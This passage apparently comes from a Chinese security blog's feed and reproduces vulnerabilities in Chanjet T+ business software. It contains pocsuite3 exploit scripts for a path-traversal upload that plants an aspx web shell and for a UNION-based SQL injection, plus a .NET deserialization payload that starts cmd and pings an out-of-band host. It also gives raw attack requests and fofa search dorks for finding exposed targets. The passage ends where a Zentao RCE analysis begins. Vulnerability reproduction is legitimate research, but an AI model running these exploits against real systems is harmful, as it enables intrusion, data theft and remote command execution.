<span class="hljs-string">&#x27;畅捷通T+单机版&lt;=17.0且使用IIS10.0以下版本&#x27;</span><br>    vulType = <span class="hljs-string">&#x27;Arbitrary File Read&#x27;</span><br>    desc = <span class="hljs-string">&#x27;Vulnerability description&#x27;</span><br>    samples = [<span class="hljs-string">&#x27;&#x27;</span>]<br>    install_requires = [<span class="hljs-string">&#x27;&#x27;</span>]<br>    pocDesc = <span class="hljs-string">&#x27;User manual of poc&#x27;</span><br>    dork = &#123;<span class="hljs-string">&#x27;fofa&#x27;</span>: <span class="hljs-string">&#x27;app=&quot;畅捷通-TPlus&quot;&#x27;</span>&#125;<br>    suricata_request = <span class="hljs-string">&#x27;&#x27;</span><br>    suricata_response = <span class="hljs-string">&#x27;&#x27;</span><br><br>    def _options(self):<br>        o = OrderedDict()<br>        o[<span class="hljs-string">&#x27;file_dll&#x27;</span>] = OptString(<span class="hljs-string">&#x27;&#x27;</span>, description=<span class="hljs-string">&#x27;dll文件&#x27;</span>)<br>        o[<span class="hljs-string">&#x27;file_compiled&#x27;</span>] = OptString(<span class="hljs-string">&#x27;&#x27;</span>, description=<span class="hljs-string">&#x27;compiled文件&#x27;</span>)<br>        <span class="hljs-keyword">return</span> o<br><br>    def _verify(self):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self._check(dork=<span class="hljs-string">&#x27;&#x27;</span>):<br>            <span class="hljs-keyword">return</span> False<br>        result = &#123;&#125;<br>        path = <span class="hljs-string">&quot;/tplus/SM/SetupAccount/Upload.aspx?preload=1&quot;</span><br>        headers = &#123;<br>            <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36&#x27;</span>,<br>        &#125;<br>        url = self.url + path<br>        req = requests.post(url=url,headers=headers)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;无标题页&quot;</span> <span class="hljs-keyword">in</span> req.text <span class="hljs-keyword">and</span> req.status_code == <span class="hljs-number">200</span>:<br>            result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>] = &#123;&#125;<br>            result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>][<span class="hljs-string">&#x27;URL&#x27;</span>] = self.url<br>        <span class="hljs-keyword">return</span> self.parse_output(result)<br><br>    def _attack(self):<br>        result = &#123;&#125;<br>        path = <span class="hljs-string">&quot;/tplus/SM/SetupAccount/Upload.aspx?preload=1&quot;</span><br>        headers = &#123;<br>            <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36&#x27;</span>,<br>        &#125;<br>        url = self.url + path<br>        filename_compiled = self.get_option(<span class="hljs-string">&#x27;file_compiled&#x27;</span>)<br>        filename_dll = self.get_option(<span class="hljs-string">&#x27;file_dll&#x27;</span>)<br>        <span class="hljs-meta">#res = self._exploit(filename_compiled,filename_dll)</span><br>        file_dlls = re.findall(r<span class="hljs-string">&quot;[\w.]+\.dll&quot;</span>, filename_dll)<br>        file_cmps = re.findall(r<span class="hljs-string">&quot;[\w.]+\.compiled&quot;</span>, filename_compiled)<br>        file_shell = re.findall(r<span class="hljs-string">&quot;[\w.]+\.aspx&quot;</span>, filename_compiled)<br><br>        files1 = &#123;<span class="hljs-string">&quot;File1&quot;</span>: (<span class="hljs-string">&quot;../../../bin/&quot;</span> + file_dlls[<span class="hljs-number">0</span>], open(filename_dll, <span class="hljs-string">&quot;rb&quot;</span>), <span class="hljs-string">&quot;image/jpeg&quot;</span>)&#125;<br>        resq_0 = requests.post(url=url, headers=headers, files=files1, timeout=<span class="hljs-number">10000</span>)<br><br>        files2 = &#123;<span class="hljs-string">&quot;File1&quot;</span>: (<span class="hljs-string">&quot;../../../bin/&quot;</span> + file_cmps[<span class="hljs-number">0</span>], open(filename_compiled, <span class="hljs-string">&quot;rb&quot;</span>), <span class="hljs-string">&quot;image/jpeg&quot;</span>)&#125;<br>        resq_1 = requests.post(url=url, headers=headers, files=files2, timeout=<span class="hljs-number">10000</span>)<br>        <span class="hljs-keyword">if</span> resq_0.status_code == <span class="hljs-number">200</span> <span class="hljs-keyword">and</span> resq_1.status_code == <span class="hljs-number">200</span>:<br>            res = requests.<span class="hljs-keyword">get</span>(url=self.url + <span class="hljs-string">&quot;/tplus/&quot;</span> + file_shell[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot;?preload=1&quot;</span>, headers=headers)<br>            result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>] = &#123;&#125;<br>            result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>][<span class="hljs-string">&#x27;URL&#x27;</span>] = self.url<br>            result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>][<span class="hljs-string">&#x27;Shell&#x27;</span>] = self.url + <span class="hljs-string">&quot;/tplus/&quot;</span> + file_shell[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot;?preload=1&quot;</span><br>        <span class="hljs-keyword">return</span> self.parse_output(result)<br><br>    def _shell(self):<br>        <span class="hljs-keyword">return</span> self._verify()<br><br><br>register_poc(DemoPOC)<br><br></code></pre></td></tr></table></figure><h3 id="畅捷通T-SQL注入漏洞复现（QVD-2023-13612）"><a href="#畅捷通T-SQL注入漏洞复现（QVD-2023-13612）" class="headerlink" title="畅捷通T+ SQL注入漏洞复现（QVD-2023-13612）"></a>畅捷通T+ SQL注入漏洞复现（QVD-2023-13612）</h3><h4 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><pre><code class="hljs"> 畅捷通 T+ 是一款基于互联网的新型企业管理软件，功能模块包括：财务管理、采购管理、库存管理等。主要针对中小型工贸和商贸企业的财务业务一体化应用，融入了社交化、移动化、物联网、电子商务、互联网信息订阅等元素</code></pre><p> 畅捷通T+的某后台功能点只校验了权限，未对用户的输入进行过滤，导致在权限绕过后存在SQL注入漏洞，利用此漏洞攻击者最终可以实现远程命令执行。</p><h4 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h4><p>   畅捷通T+ 13.0<br>   畅捷通T+ 16.0</p><h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>POC</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs csharp">POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex HTTP/<span class="hljs-number">1.1</span><br>Host: your-ip<br>Accept: *<span class="hljs-comment">/*</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0</span><br><span class="hljs-comment"> </span><br><span class="hljs-comment">&#123;&quot;accNum&quot;: &quot;3&#x27;&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125;</span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure><p>从路由上来反编译漏洞文件。<br><code>Ufida.T.SM.UP.dll/MultiCompanyController</code><br>AjaxMethod方法<br>这段代码是一个C#方法，用于检查互斥锁。根据传入的参数，它会调用互斥锁服务来注册一个函数，同时还会检查用户的功能权限。如果发生了互斥锁异常（MutexException），则返回该异常的消息；如果发生了其他异常，则返回该异常的消息；否则返回空字符串。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs csharp">[<span class="hljs-meta">AjaxMethod</span>]<br><span class="hljs-comment">//三个字符串参数url、accNum、functionTag</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> <span class="hljs-title">CheckMutex</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> url, <span class="hljs-built_in">string</span> accNum, <span class="hljs-built_in">string</span> functionTag</span>)</span><br>&#123;<br>            <span class="hljs-comment">//进程同步，促进依赖注入获取服务</span><br>IMutex mutex = ServiceFactory.getService() <span class="hljs-keyword">as</span> IMutex;<br><span class="hljs-keyword">try</span><br>&#123;<br>                <span class="hljs-comment">//如果functionTag参数为SYS0104进入判断</span><br><span class="hljs-keyword">if</span> (functionTag == <span class="hljs-string">&quot;SYS0104&quot;</span>)<br>&#123;<br>                    <span class="hljs-comment">//寻找CheckUserFunction</span><br>mutex.CheckUserFunction(accNum);<br>&#125;<br>mutex.RegisterFunction(url, accNum, functionTag);<br>&#125;<br><span class="hljs-keyword">catch</span> (MutexException ex)<br>&#123;<br><span class="hljs-keyword">return</span> ex.MutexMessage;<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception ex2)<br>&#123;<br><span class="hljs-keyword">return</span> ex2.Message;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>.Empty;<br>&#125;<br></code></pre></td></tr></table></figure><p>没找到具体的漏洞原因语句。<br>直接上sqlmap<br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692523255564-bdffd7b6-3286-4528-92d2-2dc9ee1085ff.png#averageHue=%231e1e1e&clientId=u7ce150a9-92f4-4&from=paste&height=634&id=uc4ba528e&originHeight=792&originWidth=1483&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=145948&status=done&style=none&taskId=ua823a530-5209-4695-b2d7-2584be8b869&title=&width=1186.4" alt="image.png"></p><h4 id="POC3"><a href="#POC3" class="headerlink" title="POC3"></a>POC3</h4><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-meta">#!/usr/bin/env python3</span><br><span class="hljs-meta"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> pocsuite3.<span class="hljs-function">api <span class="hljs-title">import</span> (<span class="hljs-params"></span></span><br><span class="hljs-params"><span class="hljs-function">    minimum_version_required, POCBase, register_poc, requests, logger,</span></span><br><span class="hljs-params"><span class="hljs-function">    OptString, OrderedDict,</span></span><br><span class="hljs-params"><span class="hljs-function">    random_str,</span></span><br><span class="hljs-params"><span class="hljs-function"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">minimum_version_required</span>(<span class="hljs-params"><span class="hljs-string">&#x27;1.9.6&#x27;</span></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-keyword">class</span> <span class="hljs-title">DemoPOC</span>(<span class="hljs-params">POCBase</span>):</span><br><span class="hljs-function">    vulID</span> = <span class="hljs-string">&#x27;0&#x27;</span><br>    version = <span class="hljs-string">&#x27;1&#x27;</span><br>    author = <span class="hljs-string">&#x27;0&#x27;</span><br>    vulDate = <span class="hljs-string">&#x27;2023-02-10&#x27;</span><br>    createDate = <span class="hljs-string">&#x27;2023-08-20&#x27;</span><br>    updateDate = <span class="hljs-string">&#x27;2023-08-20&#x27;</span><br>    references = [<span class="hljs-string">&#x27;https://nox.qianxin.com/article/604&#x27;</span>]<br>    name = <span class="hljs-string">&#x27;畅捷通 T+ SQL注入漏洞(QVD-2023-13612)&#x27;</span><br>    appPowerLink = <span class="hljs-string">&#x27;https://www.chanjetvip.com&#x27;</span><br>    appName = <span class="hljs-string">&#x27;畅捷通&#x27;</span><br>    appVersion = <span class="hljs-string">&#x27;畅捷通T+ 13.0,畅捷通T+ 16.0&#x27;</span><br>    vulType = <span class="hljs-string">&#x27;SQL Injection&#x27;</span><br>    desc = <span class="hljs-string">&#x27;Vulnerability description&#x27;</span><br>    samples = [<span class="hljs-string">&#x27;&#x27;</span>]<br>    install_requires = [<span class="hljs-string">&#x27;&#x27;</span>]<br>    pocDesc = <span class="hljs-string">&#x27;User manual of poc&#x27;</span><br>    dork = &#123;<span class="hljs-string">&#x27;fofa&#x27;</span>: <span class="hljs-string">&#x27;app=&quot;畅捷通-TPlus&quot;&#x27;</span>&#125;<br>    suricata_request = <span class="hljs-string">&#x27;&#x27;</span><br>    suricata_response = <span class="hljs-string">&#x27;&#x27;</span><br><br>    def _options(self):<br>        o = OrderedDict()<br>        o[<span class="hljs-string">&#x27;param&#x27;</span>] = OptString(<span class="hljs-string">&#x27;&#x27;</span>, description=<span class="hljs-string">&#x27;The param&#x27;</span>)<br>        <span class="hljs-keyword">return</span> o<br><br>    def _exploit(self, param=<span class="hljs-string">&#x27;&#x27;</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self._check(dork=<span class="hljs-string">&#x27;&#x27;</span>):<br>            <span class="hljs-keyword">return</span> False<br><br>        sql_url = <span class="hljs-string">&quot;/tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex&quot;</span><br>        headers = &#123;<br>            <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/application/json&#x27;</span>,<br>            <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36&#x27;</span>&#125;<br>        payload = &#123;<span class="hljs-string">&quot;accNum&quot;</span>: <span class="hljs-string">&quot;3&#x27; UNION ALL SELECT CHAR(113)+CHAR(113)+CHAR(113)+CHAR(112)+CHAR(113)+ISNULL(CAST(DB_NAME() AS VARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(98)+CHAR(106)+CHAR(106)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- TIKB&quot;</span>, <span class="hljs-string">&quot;functionTag&quot;</span>: <span class="hljs-string">&quot;SYS0104&quot;</span>, <span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">&quot;&quot;</span>&#125;<br>        res = requests.post(self.url + sql_url, headers=headers, json=payload)<br>        logger.debug(res.text)<br>        <span class="hljs-keyword">return</span> res<br><br>    def _verify(self):<br>        result = &#123;&#125;<br>        param = <span class="hljs-string">&#x27;&#x27;</span><br>        res = self._exploit(param)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;在将 varchar 值&quot;</span> <span class="hljs-keyword">in</span> res.text:<br>            db_name = res.json()<br>            result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>] = &#123;&#125;<br>            result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>][<span class="hljs-string">&#x27;URL&#x27;</span>] = self.url<br>            result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>][param] = db_name[<span class="hljs-string">&#x27;value&#x27;</span>]<br>            result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>][<span class="hljs-string">&#x27;docs&#x27;</span>] = <span class="hljs-string">&quot;保存SQlmap进行后续&quot;</span><br>        <span class="hljs-keyword">return</span> self.parse_output(result)<br><br>    def _attack(self):<br>        result = &#123;&#125;<br>        param = self.get_option(<span class="hljs-string">&#x27;param&#x27;</span>)<br>        res = self._exploit(param)<br>        result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>] = &#123;&#125;<br>        result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>][<span class="hljs-string">&#x27;URL&#x27;</span>] = self.url<br>        result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>][param] = res<br>        <span class="hljs-keyword">return</span> self.parse_output(result)<br><br>    def _shell(self):<br>        <span class="hljs-keyword">return</span> self._verify()<br><br><br>register_poc(DemoPOC)<br><br></code></pre></td></tr></table></figure><h3 id="畅捷通T-反序列化漏洞复现（QVD-2023-13615）"><a href="#畅捷通T-反序列化漏洞复现（QVD-2023-13615）" class="headerlink" title="畅捷通T+ 反序列化漏洞复现（QVD-2023-13615）"></a>畅捷通T+ 反序列化漏洞复现（QVD-2023-13615）</h3><h4 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><pre><code class="hljs">   畅捷通 T+ 是一款基于互联网的新型企业管理软件，功能模块包括：财务管理、采购管理、库存管理等。主要针对中小型工贸和商贸企业的财务业务一体化应用，融入了社交化、移动化、物联网、电子商务、互联网信息订阅等元素。   畅捷通 T+ 存在.net反序列化漏洞，未经过身份认证的攻击者可以通过构造恶意的序列化请求在目标服务器上执行任意命令。</code></pre><h4 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h4><pre><code class="hljs">  畅捷通 T+ 13.0  畅捷通 T+ 16.0</code></pre><h4 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>PS:X-Ajaxpro-Method：用于指定在Ajax请求中要调用的服务器端方法的名称</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs csharp">POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/<span class="hljs-number">1.1</span><br>Host: your-ip<br>X-Ajaxpro-Method: GetStoreWarehouseByStore<br> <br>&#123;<br>  <span class="hljs-string">&quot;storeID&quot;</span>:&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>翻看源代码</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs csharp">[<span class="hljs-meta">AjaxMethod</span>]<br><span class="hljs-function"><span class="hljs-keyword">public</span> WarehouseDTO <span class="hljs-title">GetStoreWarehouseByStore</span>(<span class="hljs-params"><span class="hljs-built_in">object</span> storeID</span>)</span><br>&#123;<br>IRRAService irraservice = ServiceFactory.getService() <span class="hljs-keyword">as</span> IRRAService;<br>WarehouseDTO warehouseDTO = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (irraservice != <span class="hljs-literal">null</span>)<br>&#123;<br>warehouseDTO = irraservice.GetStoreWarehouseByStore(Convert.ToString(storeID));<br>&#125;<br><span class="hljs-keyword">return</span> warehouseDTO;<br>&#125;<br></code></pre></td></tr></table></figure><p>看不懂，翻看教程<br>简介：在.NET处理 Ajax应用的时候，通常序列化功能由JavaSerializer类提供，它是.NET2.0之后内部实现的序列化功能的类，位于命名空间System.Web..Serialization、通过System.Web.Extensions引用，让开发者轻松实现.Net中所有类型和Json数据之间的转换，但在某些场景下开发者使用Deserialize 或DeserializeObject方法处理不安全的Json数据时会造成反序列化攻击从而实现远程RCE漏洞<br>使用ysoserial.net工具构造payload（攻击链：ObjectDataProvider）</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs csharp">&#123;<br>    <span class="hljs-string">&#x27;$type&#x27;</span>:<span class="hljs-string">&#x27;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&#x27;</span>,<br>    <span class="hljs-string">&#x27;MethodName&#x27;</span>:<span class="hljs-string">&#x27;Start&#x27;</span>,<br>    <span class="hljs-string">&#x27;MethodParameters&#x27;</span>:&#123;<br>        <span class="hljs-string">&#x27;$type&#x27;</span>:<span class="hljs-string">&#x27;System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#x27;</span>,<br>        <span class="hljs-string">&#x27;$values&#x27;</span>:[<span class="hljs-string">&#x27;cmd&#x27;</span>, <span class="hljs-string">&#x27;/c calc&#x27;</span>]<br>    &#125;,<br>    <span class="hljs-string">&#x27;ObjectInstance&#x27;</span>:&#123;<span class="hljs-string">&#x27;$type&#x27;</span>:<span class="hljs-string">&#x27;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#x27;</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692942202542-8dba11d0-defe-449e-82be-85eacc0ca701.png#averageHue=%23171717&clientId=uaee44d69-b62d-4&from=paste&height=303&id=u9d405401&originHeight=455&originWidth=1752&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=66428&status=done&style=none&taskId=u61120e37-278d-40d5-b9cb-4499e09ba3b&title=&width=1168" alt="image.png"><br>无回显，ping dnslog。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs csharp">POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span><span class="hljs-number">.150</span><span class="hljs-number">.186</span>:<span class="hljs-number">8080</span><br>Content-Length: <span class="hljs-number">613</span><br>Cache-Control: max-age=<span class="hljs-number">0</span><br>X-Ajaxpro-Method: GetStoreWarehouseByStore<br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>Origin: http:<span class="hljs-comment">//192.168.150.186:8080</span><br>Content-Type: application/json<br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">103.0</span><span class="hljs-number">.5060</span><span class="hljs-number">.53</span> Safari/<span class="hljs-number">537.36</span><br><br>&#123;<br>  <span class="hljs-string">&quot;storeID&quot;</span>:&#123;<br> <span class="hljs-string">&quot;__type&quot;</span>:<span class="hljs-string">&quot;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot;</span>,<br>    <span class="hljs-string">&quot;MethodName&quot;</span>:<span class="hljs-string">&quot;Start&quot;</span>,<br>    <span class="hljs-string">&quot;ObjectInstance&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__type&quot;</span>:<span class="hljs-string">&quot;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;</span>,<br>        <span class="hljs-string">&quot;StartInfo&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;__type&quot;</span>:<span class="hljs-string">&quot;System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;</span>,<br>            <span class="hljs-string">&quot;FileName&quot;</span>:<span class="hljs-string">&quot;cmd&quot;</span>, <span class="hljs-string">&quot;Arguments&quot;</span>:<span class="hljs-string">&quot;/c ping d6k1otxxiadnfy2mqzxg6o1uelkc81.oastify.com&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692942248475-f820a2f1-37e8-46d3-9470-f24e3b3b63e3.png#averageHue=%23fbfbfb&clientId=uaee44d69-b62d-4&from=paste&height=649&id=ub678b10c&originHeight=974&originWidth=2078&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=213306&status=done&style=none&taskId=u5b45e4b4-819c-4a39-ba4f-e40430f94d5&title=&width=1385.3333333333333" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692942257933-90a406a9-b5e9-4af1-942d-b8f7c073a769.png#averageHue=%23f6f3f1&clientId=uaee44d69-b62d-4&from=paste&height=685&id=u557d4bab&originHeight=1028&originWidth=1268&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=80696&status=done&style=none&taskId=u1d6da6af-3d70-48e0-83d0-ce5ec567734&title=&width=845.3333333333334" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>Net</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>禅道研发项目管理系统命令注</title>
    <link href="/2023/01/07/%E7%A6%85%E9%81%93%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/01/07/%E7%A6%85%E9%81%93%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h3 id="漏洞概况"><a href="#漏洞概况" class="headerlink" title="漏洞概况"></a>漏洞概况</h3><p>近日，X步在线通过“X漏洞奖励计划”获取到禅道研发项目管理系统命令注入漏洞的0day相关漏洞情报，攻击者可以通过利用权限绕过结合后台命令执行，导致系统被攻击与控制。</p><p>从发布漏洞详情中了解到，此次漏洞是<strong>权限绕过</strong>加<strong>后台命令执行</strong>造成的RCE<strong>。</strong></p><p><a href="https://www.cnblogs.com/magic-zero/p/17055893.html">禅道项目管理系统未授权RCE分析记录 - magic_zero - 博客园</a></p><p>从漏洞简介处得知需要进行权限绕过、后台命令执行，我们先从权限绕过这部分开始。<br>从官网安装禅道<br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1677051840056-1e79e1db-6f52-42f5-ad61-592b37222048.png" alt="image.png"></p><p>首先定位到权限验证方法 <code>module/common/model.php-&gt;checkPriv()</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1677052081998-626fb210-d4a4-4076-bd3c-dc6168c87730.png" alt="image.png"><br>方法介绍翻译：<br>检查用户是否有权限访问此方法，如果没有，则定位到登录页面或拒绝页面。</p><p>让我们来对<code>checkPriv()</code>方法具体分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 